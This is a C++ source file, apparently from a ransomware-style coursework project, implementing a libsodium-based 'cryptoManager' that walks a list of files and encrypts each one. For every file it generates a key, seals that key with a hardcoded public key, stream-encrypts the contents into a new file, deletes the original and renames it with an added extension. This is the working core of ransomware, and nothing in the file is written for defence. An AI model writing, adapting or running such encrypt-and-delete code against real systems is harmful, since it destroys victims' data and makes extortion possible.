#include "CryptoManager.hpp"
#include "Logs.hpp"
#include <iostream>
#include <fstream>

cryptoManager::cryptoManager()
{
}
cryptoManager::~cryptoManager()
{
}
cryptoManager::cryptoManager(Config conf, std::vector<fs::path> files) : _conf(conf), _files(files), _header(HEADER_SIZE)
{
    _buffer.resize(BUFFER_SIZE);
}

void cryptoManager::generateAsymKey()
{
    crypto_secretbox_keygen(_symKey.data());
}
void cryptoManager::encryptSymmKey()
{
    crypto_box_seal(_symKeyEncrypted.data(), _symKey.data(), _symKey.size(), _asymKey.data());
}

void cryptoManager::writeEncryptSymmKey(std::ofstream &out) const
{
    out.write(reinterpret_cast<const char *>(_symKeyEncrypted.data()), _symKeyEncrypted.size());
}

void cryptoManager::writeHeader(std::ofstream &out) const
{
    out.write(reinterpret_cast<const char *>(_header.data()), _header.size());
}

void cryptoManager::writeEncryptedData(std::ifstream &in, std::ofstream &out)
{

    while (in)
    {
        in.read(reinterpret_cast<char *>(_buffer.data()), _buffer.size());
        std::streamsize bytesRead = in.gcount();
        if (bytesRead > 0)
        {
            unsigned long long clen;
            _encryptedBuffer.resize(bytesRead + STREAM_MAC_SIZE);
            crypto_secretstream_xchacha20poly1305_push(&_state, _encryptedBuffer.data(), &clen, _buffer.data(), bytesRead, nullptr, 0, 0);
            out.write(reinterpret_cast<char *>(_encryptedBuffer.data()), clen);
        }
    }
}

void cryptoManager::init()
{
    if (sodium_init() < 0)
        throw(std::runtime_error("Lipsodium initialization failed"));

    Logs logs(_conf.silent);
    FileManager fs;

    for (auto &file : _files)
    {
        std::ifstream in = fs.openOriginalFile(file);
        if (!in)
        {
            logs.printError("Failed to open: " + file.filename().string());
            continue;
        }
        fs::path oldPath = file;
        std::ofstream out = fs.createEncryptedFile(file);
        if (!out)
        {
            logs.printError("Creation of the encrypted file failed for file: " + file.filename().string());
            continue;
        }
        generateAsymKey();
        encryptSymmKey();
        writeEncryptSymmKey(out);
        crypto_secretstream_xchacha20poly1305_init_push(&_state, _header.data(), _symKey.data());
        writeHeader(out);
        writeEncryptedData(in, out);
        fs::remove(oldPath);
        fs.addFtExt(file);
    }
}

//------------------------------------------------------------------------

void cryptoManager::convertsymKeyToHex()
{
    sodium_bin2hex(_hex_symKey.data(), _hex_symKey.size(), _symKey.data(), _symKey.size());
}

void cryptoManager::hexToBinAsymPubKey()
{
    sodium_hex2bin(_asymKey.data(), _asymKey.size(), ASYM_KEY_PUB.c_str(), ASYM_KEY_PUB.size(), nullptr, nullptr, nullptr);
}

void cryptoManager::printHExsymKey()
{
    std::cout << "Key = " << _hex_symKey.data() << std::endl;
    std::cout << "len = " << _hex_symKey.size() << std::endl;
}